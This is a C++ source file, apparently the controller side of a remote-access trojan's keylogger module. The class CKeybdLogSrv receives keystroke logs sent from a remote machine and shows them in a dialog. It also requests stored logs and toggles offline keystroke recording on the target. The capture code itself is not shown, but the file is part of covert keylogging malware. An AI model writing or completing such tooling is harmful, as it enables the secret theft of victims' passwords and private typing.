#include "stdafx.h"
#include "KeybdLogSrv.h"
#include "KeybdLogDlg.h"


CKeybdLogSrv::CKeybdLogSrv(DWORD dwIdentity):
CEventHandler(dwIdentity)
{
	m_pDlg = NULL;
}


CKeybdLogSrv::~CKeybdLogSrv()
{
}
void CKeybdLogSrv::OnClose(){
	if (m_pDlg){
		m_pDlg->SendMessage(WM_CLOSE);
		m_pDlg->DestroyWindow();
		delete m_pDlg;
		m_pDlg = NULL;
	}
}

void CKeybdLogSrv::OnConnect(){
	m_pDlg = new CKeybdLogDlg(this);
	if (FALSE == m_pDlg->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow())){
		Disconnect();
		return;
	}
	m_pDlg->ShowWindow(SW_SHOW);
}

void CKeybdLogSrv::OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer){
	switch (Event)
	{
	case KEYBD_LOG_ERROR:
		OnLogError((wchar_t*)Buffer);
		break;
	case KEYBD_LOG_DATA:
		OnLogData(Buffer);
		break;
	case KEYBD_LOG_INITINFO:
		OnLogInit(Buffer);
	default:
		break;
	}
}

//数据到来
void CKeybdLogSrv::OnLogData(char*szLog){
	m_pDlg->SendMessage(WM_KEYBD_LOG_DATA, (WPARAM)szLog, 0);
}

//获取日志
void CKeybdLogSrv::GetLogData(){
	Send(KEYBD_LOG_GET_LOG, 0, 0);
}
//离线记录
void CKeybdLogSrv::SetOfflineRecord(BOOL bOfflineRecord)
{
	Send(KEYBD_LOG_SETOFFLINERCD, (char*)&bOfflineRecord, 1);
}

//
void CKeybdLogSrv::OnLogError(wchar_t*szError){
	m_pDlg->SendMessage(WM_KEYBD_LOG_ERROR, (WPARAM)(szError), 0);
	Disconnect();
}

void CKeybdLogSrv::OnLogInit(char*InitInfo)
{
	bool bOfflineRecord = InitInfo[0];
	m_pDlg->SendMessage(WM_KEYBD_LOG_INIT, bOfflineRecord, 0);
}